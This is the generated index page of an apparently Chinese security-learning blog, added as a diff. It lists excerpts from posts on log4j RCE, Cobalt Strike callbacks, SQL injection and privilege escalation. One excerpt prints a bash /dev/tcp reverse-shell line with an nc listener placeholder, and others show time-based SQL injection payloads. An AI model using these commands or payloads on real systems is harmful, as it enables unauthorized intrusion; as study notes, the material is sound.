@@ -1,0 +1,910 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#795548">
+  <meta name="description" content="">
+  <meta name="author" content="一叶枯舟">
+  <meta name="keywords" content="">
+  
+  <title>一叶枯舟</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 100vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>一叶枯舟</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="fgets(&s, 1024, stdin);  printf(&s);">
+              
+            </span>
+
+            
+          </div>
+
+          
+            <div class="scroll-down-bar">
+              <i class="iconfont icon-arrowdown"></i>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      <div class="container nopadding-x-md">
+        <div class="py-5" id="board"
+          style=margin-top:0>
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/" target="_self">
+          <img src="https://zwz12138.github.io/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20211213165205181.png" srcset="/img/loading.gif" lazyload alt="log4j远程RCE漏洞复现笔记">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">log4j远程RCE漏洞复现笔记</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">
+          
+          
+            
+          
+           log4j远程rce复现笔记
+ 0x00  Vulfocus搭建
+其实直接在docker拉取镜像即可，不过我觉得这个漏洞集成环境还是挺不错的，就顺手试试，环境Ubuntu20.10，参考官方文档vulfocus/INSTALL.md at master · fofapro/vulfocus (github.com)
+1.先安装docker,使用国内daocloud 一键安装命令
+1curl -s
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-12-13 16:55" pubdate>
+              2021-12-13
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0/">学习</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/11/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91cs%E4%B8%8A%E7%BA%BF%E6%B8%97%E9%80%8F/">记录一次内网不出网cs上线渗透操作过程</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/11/17/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91cs%E4%B8%8A%E7%BA%BF%E6%B8%97%E9%80%8F/">
+          
+          
+            
+          
+           记录一次内网不出网cs上线渗透
+ 0x00
+因为遇到一个不出网的站并且拿到了shell，就想试试免杀上线cs。
+ 0x01 pystinger使用
+这次用的是FunnyWolf/pystinger: Bypass firewall for traffic forwarding using webshell 一款使用webshell进行流量转发的出网工具 (github.com) ，来实现的。
+1
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-11-17 17:22" pubdate>
+              2021-11-17
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0/">学习</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/11/11/%EF%BC%88CVE-2018-6893%EF%BC%89Finecms-5-2-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88dns%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89%E8%AE%B0%E5%BD%95/">（CVE-2018-6893）Finecms-5-2-0-SQL注入漏洞（dns注入-时间盲注）记录</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/11/11/%EF%BC%88CVE-2018-6893%EF%BC%89Finecms-5-2-0-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88dns%E6%B3%A8%E5%85%A5-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89%E8%AE%B0%E5%BD%95/">
+          
+          
+            
+          
+           （CVE-2018-6893）Finecms-5-2-0-SQL注入漏洞（dns注入-时间盲注）记录
+ 0x00
+最近遇到个站用的是finecms，然后看漏洞库有一个SQL注入的漏洞，试了试符合漏洞库上说的特征，输入以下payload正常显示，如果更改内容可以导致报错。（2e746573747465737473742e636579652e696f5c5c616161）是unc路径的十六进制编码。
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-11-11 22:11" pubdate>
+              2021-11-11
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0/">学习</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/">ATT&amp;CK红队评估二 内网靶场记录</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/10/03/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E4%BA%8C-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/">
+          
+          
+            
+          
+           ATT&amp;CK红队评估二套靶场
+ 0x00 环境搭建
+
+​		这里有个坑，就是WEB靶机密码是不对的，就离谱，我网上找了半天也没看到有人说这个问题，最后看到一个师傅的博客上说web靶机密码不对可以还原虚拟机快照，WEB靶机恢复到快照1.3即可
+
+靶机配置：
+
+ 0x01 外网信息收集
+注：我这搭建的的环境不太对劲，不管我怎么操作，WEB机器一直连不上域网络，而且登陆就会提示此工作站与域的信
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-10-03 12:23" pubdate>
+              2021-10-03
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0/">学习</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2021/09/28/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/" target="_self">
+          <img src="https://zwz12138.github.io/2021/09/28/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20210930163435106.png" srcset="/img/loading.gif" lazyload alt="java反序列化学习与复现">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/09/28/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/">java反序列化学习与复现</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/09/28/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/">
+          
+          
+            
+          
+           java反序列化学习与复现
+ 0x00 前言
+​		最近面试被问到了，学长说那位是大佬，还问了二进制（好久没学了突然问二进制，没准备只能知道啥答啥了qaq，怕是寄了），奈何自己一直没去了解java反序列化，虽然挖到过shiro反序列化，但是没有去详细了解，不过我呢要学就是那种详细了解的，最近一直在学红队的技术（内网渗透，还看了冰蝎的魔改，frp的魔改，确实大佬们挺强），和实战挖洞，不多说先实际操
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-09-28 23:12" pubdate>
+              2021-09-28
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0/">学习</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/09/27/windows-linux%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%91%BD%E4%BB%A4%E4%BB%A5%E5%8F%8A%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95-%E6%9C%AA%E5%A4%8D%E7%8E%B0%EF%BC%89/">linux/Windows提权(方法以及命令记录/未复现)</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/09/27/windows-linux%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%91%BD%E4%BB%A4%E4%BB%A5%E5%8F%8A%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95-%E6%9C%AA%E5%A4%8D%E7%8E%B0%EF%BC%89/">
+          
+          
+            
+          
+           linux/Windows提权(方法以及命令记录/未复现)
+ 1、Linux提权
+ 1.1 基础信息收集
+ 1.1.2 服务器信息收集
+1234567891011121314151617181920212223242526272829303132333435363738394041424344451、查看内核、操作系统、设备等信息uname -a    打印所有可用的系统信息uname -r  
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-09-27 16:02" pubdate>
+              2021-09-27
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0/">学习</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/09/25/python%E5%88%86%E5%89%B2%E8%A1%A5%E5%85%A8ip%E5%B0%8F%E8%84%9A%E6%9C%AC-%E7%94%A8%E4%BA%8Egoby/">python分割补全ip小脚本(用于goby)</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/09/25/python%E5%88%86%E5%89%B2%E8%A1%A5%E5%85%A8ip%E5%B0%8F%E8%84%9A%E6%9C%AC-%E7%94%A8%E4%BA%8Egoby/">
+          
+          
+            
+          
+           python分割补全ip小脚本(用于goby)
+ 0x00 前言
+​		在渗透测试中，时常遇到给的资产像123.123.123.12-46,123.211.111.2,123.123.111.4-7,111.111.111.111，诸如此类用逗号分开，然后ip范围是在后面像12-46这样指定的资产，goby不能识别这样的ip，只认123.123.123.12-123.123.123.46，这样的
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-09-25 22:24" pubdate>
+              2021-09-25
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/%E5%B0%8F%E5%B7%A5%E5%85%B7/">小工具</a>
+            
+              <a href="/categories/%E5%B0%8F%E5%B7%A5%E5%85%B7/%E5%AD%A6%E4%B9%A0/">学习</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/">小工具</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/" target="_self">
+          <img src="https://zwz12138.github.io/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210923170215201.png" srcset="/img/loading.gif" lazyload alt="linux/windows反弹shell的利用方式和复现">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/">linux/windows反弹shell的利用方式和复现</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/">
+          
+          
+            
+          
+           linux/windows反弹shell的利用方式和复现
+ 1.linux反弹
+ 1.1.Bash反弹
+攻击机器命令
+1nc -lvp 攻击机端口
+靶机命令
+1bash -i &gt;&amp; /dev/tcp/攻击机ip/攻击机端口 0&gt;&amp;1
+效果
+
+ 1.2.python反弹
+攻击机器命令
+1nc -lvp 攻击机端口
+靶机命令
+1python -c &quot;import
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-09-22 23:12" pubdate>
+              2021-09-22
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0/">学习</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2021/09/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8Fsql%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5payload%E5%88%A9%E7%94%A8-select-0-from-select-sleep-6-v/" target="_self">
+          <img src="https://zwz12138.github.io/2021/09/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8Fsql%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5payload%E5%88%A9%E7%94%A8-select-0-from-select-sleep-6-v/image-20210916160910664.png" srcset="/img/loading.gif" lazyload alt="记一次实战渗透sql时间注入payload利用(select(0)from(select(sleep(6)))v)">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/09/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8Fsql%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5payload%E5%88%A9%E7%94%A8-select-0-from-select-sleep-6-v/">记一次实战渗透sql时间注入payload利用(select(0)from(select(sleep(6)))v)</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/09/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8Fsql%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5payload%E5%88%A9%E7%94%A8-select-0-from-select-sleep-6-v/">
+          
+          
+            
+          
+           记一次实战sql时间注入payload利用(select(0)from(select(sleep(6)))v)
+ 0x01 前言
+​		某次渗透，又遇到了一个AWVS的payload是 (select(0)from(select(sleep(6)))v)/*’+(select(0)from(select(sleep(6)))v)+’&quot;+(select(0)from(select(sle
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-09-11 22:11" pubdate>
+              2021-09-11
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0/">学习</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/2021/08/23/%E8%AE%B0%E4%B8%80%E6%AC%A1springboot%E6%A1%86%E6%9E%B6%E7%9A%84%E5%88%A9%E7%94%A8/">记一次渗透一波三折找到的springboot利用</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2021/08/23/%E8%AE%B0%E4%B8%80%E6%AC%A1springboot%E6%A1%86%E6%9E%B6%E7%9A%84%E5%88%A9%E7%94%A8/">
+          
+          
+            
+          
+           记一次渗透一波三折找到的springboot利用
+ 0x01 前言
+​		在渗透某企业的时候（好久之前的了，写个总结），拐了七八个弯，终于在这个企业的某c段找到了个springboot未授权访问，真是拐了七八个弯，先从某管理系统入手，扫目录，弱密码，注入，还发现了fck文件编辑器，但是都没有用，最后还是突然发现该企业真实ip的特点-&gt;除了cdn的ip大多数都在一个ipc段，然后在某个ip找
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2021-08-23 12:23" pubdate>
+              2021-08-23
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-category"></i>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+              <a href="/categories/web%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0/">学习</a>
+            
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/web%E5%AD%A6%E4%B9%A0/">web学习</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+
+
+  <nav aria-label="navigation">
+    <span class="pagination" id="pagination">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/#board">2</a><a class="page-number" href="/page/3/#board">3</a><a class="extend next" rel="next" href="/page/2/#board"><i class="iconfont icon-arrowright"></i></a>
+    </span>
+  </nav>
+
+
+
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        琼ICP备2021006694号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
